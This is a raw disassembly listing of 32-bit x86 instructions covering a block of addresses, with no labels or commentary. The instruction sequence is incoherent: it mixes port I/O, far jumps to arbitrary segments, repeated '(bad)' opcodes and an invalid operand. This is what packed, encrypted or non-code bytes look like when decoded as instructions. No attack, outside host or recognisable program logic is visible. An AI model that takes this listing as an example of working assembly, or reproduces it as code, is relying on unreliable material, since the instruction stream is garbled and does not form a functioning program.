  4132e7:	and    eax,0xe982a844
  4132ec:	out    0xa2,eax
  4132ee:	shl    DWORD PTR [ebp-0x5d38d79b],0x94
  4132f5:	imul   esi,edx,0xaf870f21
  4132fb:	clc    
  4132fc:	ret    0x530e
  4132ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413300:	adc    eax,0xe2e0af4a
  413305:	lds    edx,FWORD PTR [edi-0x27]
  413308:	push   esp
  413309:	xlat   BYTE PTR ds:[ebx]
  41330a:	sub    al,0x63
  41330c:	xchg   ecx,eax
  41330d:	in     al,dx
  41330e:	mov    bh,0xfc
  413310:	xchg   ebx,eax
  413311:	mov    ebp,0x75f0a867
  413316:	fisub  WORD PTR [ecx-0xb]
  413319:	lods   al,BYTE PTR ds:[esi]
  41331a:	lods   al,BYTE PTR ds:[esi]
  41331b:	xor    eax,0xd041a675
  413320:	enter  0x5a66,0xb5
  413324:	cmc    
  413325:	dec    esp
  413326:	ins    DWORD PTR es:[edi],dx
  413327:	cmp    al,0xeb
  413329:	out    dx,al
  41332a:	es cdq 
  41332c:	jns    0x4133a1
  41332e:	mov    cl,0x8
  413330:	jecxz  0x4132d3
  413332:	mov    cl,0xb
  413334:	xchg   esi,eax
  413335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413336:	test   al,0x61
  413338:	cmp    DWORD PTR [esi-0x781f22b1],0xb2966cc3
  413342:	dec    edx
  413343:	rcl    DWORD PTR [edx],0x58
  413346:	or     eax,0xb9c0f1f4
  41334b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41334c:	inc    ebp
  41334d:	lea    edi,[esp+ebp*4]
  413350:	inc    edi
  413351:	das    
  413352:	push   esp
  413353:	pop    edx
  413354:	scas   al,BYTE PTR es:[edi]
  413355:	loope  0x41335b
  413357:	pushf  
  413358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413359:	rcr    BYTE PTR [ecx],cl
  41335b:	sub    al,0x2f
  41335d:	and    DWORD PTR [eax],ebx
  41335f:	pop    es
  413360:	pop    ebx
  413361:	pushf  
  413362:	sbb    DWORD PTR [ecx-0x5e7a4455],edi
  413368:	in     al,0xc5
  41336a:	aas    
  41336b:	aas    
  41336c:	jp     0x413365
  41336e:	arpl   WORD PTR [esi],cx
  413370:	sbb    eax,0x3e1b180f
  413375:	rcr    al,cl
  413377:	sub    DWORD PTR [edi-0x217db0b7],ebp
  41337d:	or     BYTE PTR [edi+0x29],bl
  413380:	test   al,0x56
  413382:	xchg   ebp,eax
  413383:	int    0x8
  413385:	(bad)  
  413386:	bound  eax,QWORD PTR [edx]
  413388:	(bad)  
  413389:	test   bh,0xef
  41338c:	cwde   
  41338d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41338e:	call   0x744f:0x64f6
  413394:	pushf  
  413395:	mov    edx,0x29dfa47c
  41339a:	push   ebp
  41339b:	retf   
  41339c:	mov    ah,0x1
  41339e:	call   0x141b2bb6
  4133a3:	lods   al,BYTE PTR ds:[esi]
  4133a4:	ss addr16 cld 
  4133a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a8:	mov    DWORD PTR [ebx],ebp
  4133aa:	pusha  
  4133ab:	bound  ebp,QWORD PTR [edi]
  4133ad:	xor    ah,bh
  4133af:	and    eax,0xf42751fc
  4133b4:	or     eax,0x41fd792c
  4133b9:	fisttp QWORD PTR [ebp-0x1a0815da]
  4133bf:	jne    0x41334c
  4133c1:	sub    DWORD PTR [eax+0x6b],0x173ed184
  4133c8:	and    eax,0x647a5377
  4133cd:	bound  eax,QWORD PTR [ecx+0x4d]
  4133d0:	jo     0x413383
  4133d2:	inc    edx
  4133d3:	sub    al,0x4
  4133d5:	adc    eax,0xfe4bc92b
  4133da:	aam    0xcf
  4133dc:	pop    ss
  4133dd:	adc    edx,esi
  4133df:	xchg   edx,eax
  4133e0:	gs or  cl,ch
  4133e3:	mov    ebx,0x41a5bfb5
  4133e8:	dec    ebx
  4133e9:	jns    0x4133ac
  4133eb:	call   0x353bb3a7
  4133f0:	mov    ds:0x6b6b453b,al
  4133f5:	inc    ecx
  4133f6:	push   0xffffffc1
  4133f8:	jle    0x41340f
  4133fa:	sbb    BYTE PTR [ebp+0x3e],bl
  4133fd:	cli    
  4133fe:	mov    edx,0xa8bac28
  413403:	pop    ebp
  413404:	cmp    BYTE PTR [edi+0x35],dh
  413407:	jp     0x4133f8
  413409:	xchg   edi,eax
  41340a:	jmp    0xa094f674
  41340f:	cmp    DWORD PTR [edi],eax
  413411:	in     al,dx
  413412:	lods   eax,DWORD PTR ds:[esi]
  413413:	popa   
  413414:	loop   0x41343b
  413416:	outs   dx,BYTE PTR ds:[esi]
  413417:	data16 int 0x22
  41341a:	cmp    ch,bl
  41341c:	int    0xc0
  41341e:	sub    eax,0x5921f7e7
  413423:	lods   al,BYTE PTR ds:[esi]
  413424:	jno    0x4133d3
  413426:	inc    esi
  413427:	fiadd  DWORD PTR [ebx]
  413429:	mov    ebx,0x4a9688b7
  41342e:	push   ds
  41342f:	outs   dx,DWORD PTR ds:[esi]
  413430:	pop    esi
  413431:	loop   0x41348a
  413433:	data16 in al,dx
  413435:	pusha  
  413436:	jecxz  0x413455
  413438:	jmp    0x27c4c869
  41343d:	repz push esp
  41343f:	fdivr  st(3),st
  413441:	cmc    
  413442:	mov    BYTE PTR [eax],dh
  413444:	div    BYTE PTR [ebx-0x3f0cd32c]
  41344a:	adc    dl,cl
  41344c:	lods   eax,DWORD PTR ds:[esi]
  41344d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41344e:	mov    esi,0x677f0d71
  413453:	(bad)  
  413454:	rol    BYTE PTR ds:0xb96b797f,1
  41345a:	and    dh,BYTE PTR [eax-0x5d38de70]
  413460:	sti    
  413461:	dec    ebx
  413462:	arpl   WORD PTR [ebx],cx
  413464:	out    dx,al
  413465:	sbb    eax,0xa61fe1c5
  41346a:	mov    bh,0xf8
  41346c:	arpl   WORD PTR [edx+0x641534e6],bx
  413472:	sbb    DWORD PTR [esi-0x2c],0xf
  413476:	push   ds
  413477:	xor    ebp,DWORD PTR [eax]
  413479:	jecxz  0x41344b
  41347b:	jp     0x413422
  41347d:	xor    DWORD PTR [ebx],esi
  41347f:	xor    edi,DWORD PTR [esi-0x50]
  413482:	ret    
  413483:	mov    eax,ds:0x3bfdd201
  413488:	xor    ebp,DWORD PTR [edi]
  41348a:	(bad)  
  41348b:	push   0xc8219ebe
  413490:	xchg   esp,eax
  413491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413492:	mov    ds:0x44c1bbc8,eax
  413497:	pop    ebx
  413498:	jge    0x413508
  41349a:	mov    ds:0x9bdf17c0,al
  41349f:	mov    al,0xc3
  4134a1:	add    DWORD PTR [ecx-0x76428dd5],eax
  4134a7:	arpl   WORD PTR ds:0x797866eb,sp
  4134ad:	jle    0x4134aa
  4134af:	push   ebp
  4134b0:	jmp    0x413489
  4134b2:	add    al,0x7a
  4134b4:	enter  0x4a4e,0xb7
  4134b8:	mov    ds:0x27b18c6a,al
  4134bd:	ficom  DWORD PTR [ecx+edi*1+0x75]
  4134c1:	popa   
  4134c2:	call   0x71c51449
  4134c7:	test   al,0x84
  4134c9:	data16 sbb ch,BYTE PTR [edx]
  4134cc:	ret    0xaf60
  4134cf:	xor    esp,DWORD PTR [edi]
  4134d1:	and    BYTE PTR [esi+0x4a656eb0],bh
  4134d7:	(bad)  
  4134d8:	dec    edx
  4134d9:	mov    ebp,0x6a4c676f
  4134de:	popa   
  4134df:	nop
  4134e0:	sbb    dl,bh
  4134e2:	mov    BYTE PTR [ebx-0x544fc75b],ch
  4134e8:	cmp    ebx,ebx
  4134ea:	test   eax,0xf415ac09
  4134ef:	test   BYTE PTR [ebp-0x18],bl
  4134f2:	jnp    0x413489
  4134f4:	pop    ebx
  4134f5:	retf   0xda00
  4134f8:	icebp  
  4134f9:	out    dx,al
  4134fa:	inc    esp
  4134fb:	out    0x32,al
  4134fd:	pop    ss
  4134fe:	test   BYTE PTR [edx+0x11],ch
  413501:	mov    eax,ds:0x6bacdd8a
  413506:	cs pop ebx
  413508:	mov    ebp,0xdd2d5aa3
  41350d:	mov    ebx,DWORD PTR [edi+0x5b]
  413510:	mov    esi,0x74010e0b
  413515:	pop    edx
  413516:	mov    eax,0x4004529a
  41351b:	inc    esp
  41351c:	cs pop es
  41351e:	mov    fs,WORD PTR [edi]
  413520:	or     esi,DWORD PTR [esi+0x55cfcdb5]
  413526:	addr16 (bad) 
  413528:	jl     0x4134df
  41352a:	inc    edx
  41352b:	mov    eax,ds:0xc4ea8576
  413530:	aam    0xac
  413532:	jnp    0x4134db
  413534:	mov    edi,0x5152aea7
  413539:	fst    DWORD PTR [esi+edx*8-0x2e5fdb63]
  413540:	jl     0x4135b9
  413542:	rol    DWORD PTR ss:[ebx],0xda
  413546:	stos   BYTE PTR es:[edi],al
  413547:	mov    dl,0xd3
  413549:	mov    esp,0x9648640b
  41354e:	mov    WORD PTR [edx-0x67a5f9fe],cs
  413554:	jle    0x41358d
  413556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413557:	aam    0xfe
  413559:	daa    
  41355a:	out    dx,al
  41355b:	pop    edi
  41355c:	not    DWORD PTR [ecx+ecx*8+0x0]
  413560:	pop    esp
  413561:	(bad)  
  413562:	xlat   BYTE PTR ds:[ebx]
  413563:	fdiv   st,st(0)
  413565:	shl    BYTE PTR [ebp-0x7c446524],0x4a
  41356c:	hlt    
  41356d:	adc    eax,esi
  41356f:	in     eax,dx
  413570:	iret   
  413571:	imul   eax,esi,0x515d2e77
  413577:	jg     0x4135d6
  413579:	aad    0x19
  41357b:	sbb    dh,bl
  41357d:	out    0x61,al
  41357f:	nop
  413580:	shr    dl,0x92
  413583:	cwde   
  413584:	add    BYTE PTR [edi+0x3d500545],ch
  41358a:	xlat   BYTE PTR ds:[ebx]
  41358b:	xchg   edx,eax
  41358c:	jbe    0x123eea5
  413592:	mov    BYTE PTR [ebx-0x1cfc2fd],ch
  413598:	mov    ebp,0x6ebf17f0
  41359d:	sar    DWORD PTR [eax+0x3e],0xb
  4135a1:	and    BYTE PTR ds:0x84187a5a,0xb
  4135a8:	ret    
  4135a9:	dec    ecx
  4135aa:	pop    eax
  4135ab:	test   BYTE PTR [ebx+0x19],al
  4135ae:	jnp    0x41359c
  4135b0:	clc    
  4135b1:	xchg   edi,esi
  4135b3:	cdq    
  4135b4:	(bad)  
  4135b5:	cwde   
  4135b6:	call   0xdf7c1fa2
  4135bb:	mov    ecx,0xd78a687a
  4135c0:	jb     0x41360c
  4135c2:	push   ebp
  4135c3:	rol    BYTE PTR [edi-0x44],0x38
  4135c7:	mov    edi,0x5f91e0b2
  4135cc:	dec    esi
  4135cd:	push   cs
  4135ce:	sub    BYTE PTR [eax],0xe0
  4135d1:	adc    BYTE PTR [ebp-0x2dda508f],cl
  4135d7:	iret   
  4135d8:	clc    
  4135d9:	sbb    DWORD PTR [ecx+esi*8],0x22
  4135dd:	pop    ebx
  4135de:	mov    DWORD PTR [ebx+0x24dd2e57],esp
  4135e4:	cdq    
  4135e5:	xor    edx,DWORD PTR [ebx+0x26e08751]
  4135eb:	fnstcw WORD PTR [edi-0x45]
  4135ee:	inc    esi
  4135ef:	pop    edx
  4135f0:	pop    eax
  4135f1:	pop    es
  4135f2:	jp     0x413668
  4135f4:	out    dx,al
  4135f5:	dec    esi
  4135f6:	sbb    BYTE PTR [edx-0x85a610b],0x5c
  4135fd:	xor    eax,0xccce06b2
  413602:	ins    DWORD PTR es:[edi],dx
  413603:	cmp    eax,0x6a6e5af0
  413608:	hlt    
  413609:	push   ds
  41360a:	and    al,0x7c
  41360c:	loop   0x413611
  41360e:	and    eax,0x53605baa
  413613:	xor    al,0xe2
  413615:	int3   
  413616:	aam    0x9c
  413618:	outs   dx,BYTE PTR ds:[esi]
  413619:	inc    edx
  41361a:	rcr    DWORD PTR [eax+ebp*1-0x3976727d],0xc0
  413622:	or     al,0x9c
  413624:	popf   
  413625:	aad    0x2d
  413627:	jp     0x41361b
  413629:	xchg   ecx,eax
  41362a:	mov    ch,0x48
  41362c:	dec    ebx
  41362d:	mov    bl,0xcd
  41362f:	cmp    al,0xf3
  413631:	and    ecx,edi
  413633:	popa   
  413634:	hlt    
  413635:	adc    eax,0x7e9856f4
  41363a:	js     0x413634
  41363c:	iret   
  41363d:	ja     0x413651
  41363f:	cs dec ecx
  413641:	push   0xffffff86
  413643:	sub    BYTE PTR [edi+0x37],dl
  413646:	xor    ebp,eax
  413648:	or     dh,BYTE PTR ds:0x3260c2ab
  41364e:	jno    0x413676
  413650:	lods   al,BYTE PTR ds:[esi]
  413651:	mov    bh,0xa4
  413653:	sub    cl,BYTE PTR [ecx]
  413655:	sub    ah,al
  413657:	sbb    DWORD PTR [edi+0x1ec16a6],esp
  41365d:	cwde   
  41365e:	xor    al,0x28
  413660:	jl     0x41363a
  413662:	fadd   st(5),st
  413664:	(bad)  
  413665:	mov    ebx,0x170261ed
  41366a:	sahf   
  41366b:	mov    edi,0x9e1da01d
  413670:	retf   0x33a5
  413673:	rcl    BYTE PTR [edi],cl
  413675:	clc    
  413676:	dec    ebx
  413677:	push   eax
  413678:	push   ebp
  413679:	inc    esi
  41367a:	(bad)  
  41367b:	mov    dh,0xfa
  41367d:	jp     0x41363e
  41367f:	push   ds
  413680:	ret    0x41dc
  413683:	pusha  
  413684:	rol    DWORD PTR [eax-0x2473fcd0],1
  41368a:	mov    ds:0x2c58e87a,eax
  41368f:	sbb    al,BYTE PTR [edx+0x4d]
  413692:	inc    esi
  413693:	stc    
  413694:	fadd   st(4),st
  413696:	pop    ebp
  413697:	inc    esp
  413698:	rcr    DWORD PTR [esi+eiz*8],0x80
  41369c:	call   0xb9a2731a
  4136a1:	sbb    dh,BYTE PTR ds:0xacb16c95
  4136a7:	jg     0x4136a9
  4136a9:	jg     0x413729
  4136ab:	je     0x413724
  4136ad:	das    
  4136ae:	mov    bl,0x4f
  4136b0:	sbb    cl,BYTE PTR [edx+0x3181006]
  4136b6:	mov    edi,0xece94470
  4136bb:	ins    BYTE PTR es:[edi],dx
  4136bc:	cmc    
  4136bd:	adc    eax,0xa20f4173
  4136c2:	mov    al,ds:0x45868551
  4136c7:	pop    DWORD PTR [esi]
  4136c9:	or     eax,0xc313d7bf
  4136ce:	stos   DWORD PTR es:[edi],eax
  4136cf:	pusha  
  4136d0:	ror    esp,cl
  4136d2:	sbb    eax,DWORD PTR [esi+0x7f75c2c1]
  4136d8:	mov    bl,0x4c
  4136da:	pusha  
  4136db:	mov    ebx,0xae949b48
  4136e0:	in     eax,0x35
  4136e2:	inc    ecx
  4136e3:	frstor [bx+di+0x435a]
  4136e8:	pop    ss
  4136e9:	ret    0x266d
  4136ec:	lods   eax,DWORD PTR ds:[esi]
  4136ed:	leave  
  4136ee:	inc    eax
  4136ef:	push   esp
  4136f0:	pop    eax
  4136f1:	out    0xf0,al
  4136f3:	fisubr WORD PTR [ebx-0x25]
  4136f6:	mov    ch,0x7b
  4136f8:	shl    DWORD PTR [ebx],cl
  4136fa:	js     0x4136ed
  4136fc:	outs   dx,DWORD PTR cs:[esi]
  4136fe:	bound  esi,QWORD PTR [ecx-0x6d]
  413701:	jb     0x4136eb
  413703:	xchg   DWORD PTR [eax],ebp
  413705:	mov    ch,bl
  413707:	cli    
  413708:	add    ah,cl
  41370a:	(bad)  
  41370b:	dec    esi
  41370c:	(bad)  
  41370d:	pushf  
  41370e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41370f:	sti    
  413710:	sbb    DWORD PTR [esi],ebx
  413712:	push   eax
  413713:	jo     0x413793
  413715:	dec    eax
  413716:	xor    al,0x5c
  413718:	daa    
  413719:	xor    bl,ch
  41371b:	mov    cl,0xe3
  41371d:	xor    eax,0x42f4c8b
  413722:	push   eax
  413723:	rcr    BYTE PTR [edi-0x468aa46d],0xa6
  41372a:	sbb    ebx,esi
  41372c:	mov    cl,0x2c
  41372e:	push   0x788c6ffd
  413733:	data16 loope 0x4136c9
  413736:	adc    al,0x2d
  413738:	ds loopne 0x4136cd
  41373b:	cmc    
  41373c:	and    bh,cl
  41373e:	rol    eax,cl
  413740:	js     0x4136f2
  413742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413743:	fnstenv [esi+0x3e]
  413746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413747:	inc    ebx
  413748:	adc    ecx,DWORD PTR [edi+0x5]
  41374b:	or     ebx,0xffffffd1
  41374e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41374f:	(bad)  
  413750:	adc    DWORD PTR [ebx],ecx
  413752:	aaa    
  413753:	inc    ebp
  413754:	inc    edx
  413755:	mov    DWORD PTR [edi+0x3f],esi
  413758:	shr    DWORD PTR es:[ecx],1
  41375b:	stos   DWORD PTR es:[edi],eax
  41375c:	test   DWORD PTR [ecx-0x60],0xfdfae6df
  413763:	fdivr  DWORD PTR [ebx]
  413765:	push   ss
  413766:	popf   
  413767:	retf   0x7000
  41376a:	arpl   bp,bx
  41376c:	in     eax,dx
  41376d:	xchg   esi,eax
  41376e:	fwait
  41376f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413771:	dec    ebp
  413772:	repnz test eax,0xc744373e
  413778:	stc    
  413779:	or     BYTE PTR [edi],ch
  41377b:	xor    dl,al
  41377d:	cmp    ebp,0xffffff91
  413780:	push   ss
  413781:	mov    ebx,0xa2579cfa
  413786:	out    0x62,al
  413788:	(bad)  
  413789:	sbb    al,0xe2
  41378b:	mov    dh,0x83
  41378d:	jp     0x413710
  41378f:	gs jg  0x41375a
  413792:	push   ecx
  413793:	cld    
  413794:	xor    BYTE PTR [esi-0x29],0xfa
  413798:	dec    edx
  413799:	pop    ebx
  41379a:	aas    
  41379b:	xchg   edi,eax
  41379c:	ja     0x4137ad
  41379e:	lahf   
  41379f:	cmp    eax,0x3e2a03c5
  4137a4:	jmp    FWORD PTR [edx]
  4137a6:	xchg   edi,eax
  4137a7:	(bad)  gs:[ecx-0x73]
  4137ab:	dec    edi
  4137ac:	out    dx,eax
  4137ad:	enter  0x6f7f,0xec
  4137b1:	adc    eax,0x1324ebec
  4137b6:	loopne 0x4137d8
  4137b8:	pushf  
  4137b9:	add    DWORD PTR [esi],esp
  4137bb:	or     bh,BYTE PTR fs:[esi+0x60]
  4137bf:	popf   
  4137c0:	sbb    eax,0x6991d740
  4137c5:	pop    edi
  4137c6:	in     eax,dx
  4137c7:	mov    edi,0x656eb19
  4137cc:	push   edi
  4137cd:	add    DWORD PTR [esi+ebx*8],edi
  4137d0:	jg     0x413794
  4137d2:	mov    bl,0x6d
  4137d4:	xlat   BYTE PTR ds:[ebx]
  4137d5:	and    ah,BYTE PTR [esi]
  4137d7:	(bad)  
  4137d8:	xchg   edx,eax
  4137d9:	push   eax
  4137da:	pop    ebx
  4137db:	mov    esi,DWORD PTR [eax-0x15]
  4137de:	(bad)  
  4137df:	adc    eax,0x84bf137a
  4137e4:	cmp    eax,edx
  4137e6:	iret   
  4137e7:	in     eax,0xa6
  4137e9:	mul    DWORD PTR [ebx-0x46]
  4137ec:	imul   ecx,DWORD PTR [ecx+0x34eb0b4e],0x8cfecfbb
  4137f6:	cmp    al,0xcf
  4137f8:	mov    cl,BYTE PTR [edx+0x5271e7a4]
  4137fe:	mov    eax,0xe1dd65b6
  413803:	or     BYTE PTR [edx+0x6c67cafc],cl
  413809:	xchg   ebp,eax
  41380a:	inc    edi
  41380b:	js     0x4137a1
  41380d:	popf   
  41380e:	pop    ss
  41380f:	lds    ebp,FWORD PTR [edx+0x2]
  413812:	jmp    0xeb0c:0xcb1afe4c
  413819:	ins    BYTE PTR es:[edi],dx
  41381a:	inc    ebx
  41381b:	ret    0xd935
  41381e:	push   es
  41381f:	imul   esi,DWORD PTR ds:0xb6a8181e,0x3378519f
  413829:	call   0x6ecef9f7
  41382e:	cmp    al,0x36
  413830:	mov    ch,0x3f
  413832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413833:	or     bl,BYTE PTR [eax]
  413835:	hlt    
  413836:	out    dx,eax
  413837:	push   ebp
  413838:	and    eax,0xc133f951
  41383d:	(bad)
  413841:	xor    eax,0xbee536f9
  413846:	and    DWORD PTR [edx+0xf5f7c1b],eax
  41384c:	test   eax,0xae2eb71d
  413851:	jmp    0x4138c8
  413853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413854:	fdivr  DWORD PTR fs:[edx+0xc]
  413858:	adc    ah,BYTE PTR [ecx-0x80]
  41385b:	push   ds
  41385c:	xor    eax,eax
  41385e:	jns    0x41387e
  413860:	push   ebp
  413861:	shl    DWORD PTR [bp+di-0x4070],1
  413866:	iret   
  413867:	inc    edx
  413868:	int    0xb1
  41386a:	out    dx,eax
  41386b:	push   ebx
  41386c:	(bad)  
  41386d:	push   es
  41386e:	lock add eax,DWORD PTR [ebx+0x75]
  413872:	mov    ebp,0x2b9d7524
  413877:	clc    
  413878:	or     cl,BYTE PTR [ebp+0x1206d4a9]
  41387e:	loop   0x41382d
  413880:	outs   dx,BYTE PTR ds:[esi]
  413881:	xor    al,0xbe
  413883:	or     esp,DWORD PTR [edi-0x77]
  413886:	mov    cs,WORD PTR [ebx]
  413888:	dec    edx
  413889:	xlat   BYTE PTR ds:[ebx]
  41388a:	jmp    DWORD PTR [eax+0x13710c7]
  413890:	test   eax,0xf9b23b39
  413895:	push   edx
  413896:	loop   0x413850
  413898:	jmp    0x8ba9:0x710d3722
  41389f:	inc    ecx
  4138a0:	pop    ecx
  4138a1:	into   
  4138a2:	push   es
  4138a3:	fs jmp 0x413854
  4138a6:	sbb    eax,0x4d564f6e
  4138ab:	sysexit 
  4138ad:	shr    BYTE PTR [ecx+0x74],1
  4138b0:	arpl   WORD PTR [eax-0x27131750],bx
  4138b6:	sub    BYTE PTR [ecx-0x1f1794ef],cl
  4138bc:	sub    eax,0x4c3007a6
  4138c1:	jle    0x4138ca
  4138c3:	scas   al,BYTE PTR es:[edi]
  4138c4:	or     ch,BYTE PTR [eax+0x7c3c6b0d]
  4138ca:	cmp    edx,DWORD PTR [ebx+0x309ce9a7]
  4138d0:	inc    ebp
  4138d1:	adc    DWORD PTR [edi],eax
  4138d3:	mov    bp,dx
  4138d6:	das    
  4138d7:	or     DWORD PTR [ecx+edx*2],ebx
  4138da:	ret    
  4138db:	inc    edi
  4138dc:	dec    esi
  4138dd:	hlt    
  4138de:	xor    BYTE PTR ds:0xedf30e42,bl
  4138e4:	dec    esp
  4138e5:	push   esp
  4138e6:	loopne 0x41386c
  4138e8:	aas    
  4138e9:	lahf   
  4138ea:	mov    ds:0x925afd0,al
  4138ef:	stc    
  4138f0:	(bad)  
  4138f1:	mov    al,ds:0xe716e6d4
  4138f6:	stc    
  4138f7:	xlat   BYTE PTR ds:[ebx]
  4138f8:	fsubr  QWORD PTR [esp+esi*1-0x11]
  4138fc:	and    DWORD PTR [ebx+0x2e],ebx
  4138ff:	sbb    eax,0xbbbb803b
  413904:	dec    esp
  413905:	pop    ecx
  413906:	sahf   
  413907:	sbb    BYTE PTR [esi+0x3c446b1],ah
  41390d:	repnz pop ss
  41390f:	leave  
  413910:	test   al,0xbc
  413912:	fcmovbe st,st(0)
  413914:	and    eax,0x25278897
  413919:	push   ds
  41391a:	push   esi
  41391b:	push   edi
  41391c:	mov    al,ds:0x506e1e2f
  413921:	retf   0xe878
  413924:	mov    ch,0xc2
  413926:	xchg   edi,eax
  413927:	jne    0x4138dd
  413929:	jo     0x41396d
  41392b:	rol    DWORD PTR [edi-0x37060900],0xa5
  413932:	pop    esi
  413933:	loope  0x413977
  413935:	sub    BYTE PTR [esi-0x2a],ah
  413938:	les    esi,FWORD PTR [ebx]
  41393a:	in     eax,0x86
  41393c:	pop    edx
  41393d:	and    ah,dh
  41393f:	lods   eax,DWORD PTR ds:[esi]
  413940:	gs fwait
  413942:	es inc edi
  413944:	mov    ss,WORD PTR [edi-0x69]
  413947:	mov    esp,0xcbe58490
  41394c:	cs cwde 
  41394e:	mov    eax,ds:0xd4dc48cf
  413953:	add    DWORD PTR [edx-0x7f2f7b35],eax
  413959:	pop    eax
  41395a:	xor    esi,DWORD PTR [eax]
  41395c:	and    al,0xdd
  41395e:	pushf  
  41395f:	bound  esp,QWORD PTR [esi-0x36f639e]
  413965:	xor    eax,0x317544eb
  41396a:	out    dx,al
  41396b:	mov    cl,0x48
  41396d:	ins    DWORD PTR es:[edi],dx
  41396e:	and    BYTE PTR [edi+0x3c],ch
  413971:	xchg   ecx,eax
  413972:	sti    
  413973:	push   ss
  413974:	shl    DWORD PTR [edi+eax*1],cl
  413977:	std    
  413978:	mov    cl,0x41
  41397a:	and    al,0x99
  41397c:	stos   BYTE PTR es:[edi],al
  41397d:	ret    
  41397e:	push   ebx
  41397f:	les    eax,FWORD PTR [eax+0x55df27aa]
  413985:	xchg   esi,eax
  413986:	scas   eax,DWORD PTR es:[edi]
  413987:	push   cs
  413988:	xchg   esp,eax
  413989:	stos   BYTE PTR es:[edi],al
  41398a:	sbb    ah,0x44
  41398d:	les    ebx,FWORD PTR [ebx]
  41398f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413991:	shl    DWORD PTR [esp+ecx*8-0x4714d1],1
  413998:	lock leave 
  41399a:	and    ebx,DWORD PTR [esi+edx*8]
  41399d:	ja     0x413932
  41399f:	cmp    al,BYTE PTR [eax-0x7f]
  4139a2:	inc    ebp
  4139a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a5:	ficom  DWORD PTR [ebp+ebx*4-0x7e524591]
  4139ac:	add    eax,0xf9ffaf28
  4139b1:	xor    BYTE PTR [ebx],dl
  4139b3:	push   edi
  4139b4:	sbb    BYTE PTR [ecx-0x74],bh
  4139b7:	repnz pop esi
  4139b9:	inc    ebx
  4139ba:	inc    esi
  4139bb:	jb     0x4139ef
  4139bd:	push   ebx
  4139be:	mov    ecx,DWORD PTR [edx+esi*1-0x699596db]
  4139c5:	cli    
  4139c6:	cmp    cl,BYTE PTR [edx+0x6ed91968]
  4139cc:	ins    BYTE PTR es:[edi],dx
  4139cd:	mov    al,ds:0x305ef18e
  4139d2:	nop
  4139d3:	sar    BYTE PTR [ebp-0x4e6b7018],cl
  4139d9:	sub    BYTE PTR [esi+0x4226ac68],ah
  4139df:	or     BYTE PTR [esi],al
  4139e1:	fisubr WORD PTR ds:0x3a3723e0
  4139e7:	xor    ecx,0xeda62fda
  4139ed:	or     BYTE PTR ds:0x7ff1bc16,0x98
  4139f4:	shl    DWORD PTR [ecx],cl
  4139f6:	dec    esi
  4139f7:	inc    ecx
  4139f8:	sbb    al,0xb7
  4139fa:	sbb    ebp,0x832a9b13
  413a00:	push   es
  413a01:	cmp    ah,BYTE PTR [ebp-0x51a83299]
  413a07:	push   esp
  413a08:	pop    ss
  413a09:	pop    ecx
  413a0a:	outs   dx,BYTE PTR ds:[esi]
  413a0b:	mov    ebx,0x6f753a36
  413a10:	push   esi
  413a11:	int3   
  413a12:	call   0x433b:0xddfd960d
  413a19:	leave  
  413a1a:	push   0x59
  413a1c:	rcr    BYTE PTR ss:[ecx-0x38],cl
  413a20:	pop    esp
  413a21:	cmp    al,BYTE PTR ds:[esi+0x18]
  413a25:	sti    
  413a26:	cmc    
  413a27:	xor    DWORD PTR [esi+0x59],esi
  413a2a:	xor    al,al
  413a2c:	mov    edi,0x1e7f3703
  413a31:	out    0x8b,eax
  413a33:	nop
  413a34:	sbb    cl,bh
  413a36:	dec    ebp
  413a37:	sbb    esi,DWORD PTR [eax+0x141c6abd]
  413a3d:	adc    dh,BYTE PTR [ebx+ebx*4-0x6d]
  413a41:	icebp  
  413a42:	frstor [edi]
  413a44:	out    0x55,eax
  413a46:	aad    0x34
  413a48:	push   0xf0ba6c37
  413a4d:	pop    ds
  413a4e:	daa    
  413a4f:	cmc    
  413a50:	cwde   
  413a51:	jmp    0xdc4f:0xc99a8600
  413a58:	ret    0x97b7
  413a5b:	fwait
  413a5c:	dec    esi
  413a5d:	imul   ecx,DWORD PTR [ebx+0x201cf7eb],0x9f3f34d5
  413a67:	mov    ?,WORD PTR [edx+0x7b7294fe]
  413a6d:	ret    
  413a6e:	dec    ebp
  413a6f:	adc    eax,0x3bf9d5f1
  413a74:	mov    BYTE PTR [edi],al
  413a76:	pop    es
  413a77:	das    
  413a78:	fsubr  QWORD PTR [ecx+0x50]
  413a7b:	in     eax,0x30
  413a7d:	mov    edx,0x95f9ea24
  413a82:	popf   
  413a83:	sub    eax,0x40ae11a
  413a88:	push   es
  413a89:	gs nop
  413a8b:	rcl    esp,1
  413a8d:	mov    cl,0xbc
  413a8f:	(bad)  
  413a90:	and    dl,BYTE PTR [ebp+0xe]
  413a93:	sbb    edx,DWORD PTR [eax+0x1c]
  413a96:	add    DWORD PTR [ecx+0x728013c2],esp
  413a9c:	xchg   ebx,eax
  413a9d:	repz int3 
  413a9f:	imul   ebp,DWORD PTR [edi],0xdc906eb5
  413aa5:	retf   
  413aa6:	add    al,0xaf
  413aa8:	mul    BYTE PTR ds:0x641b0940
  413aae:	aaa    
  413aaf:	push   cs
  413ab0:	mov    eax,0xd433dc56
  413ab5:	aas    
  413ab6:	adc    DWORD PTR [edi+ebx*8],esi
  413ab9:	sub    eax,0xad969aa2
  413abe:	out    dx,al
  413abf:	clc    
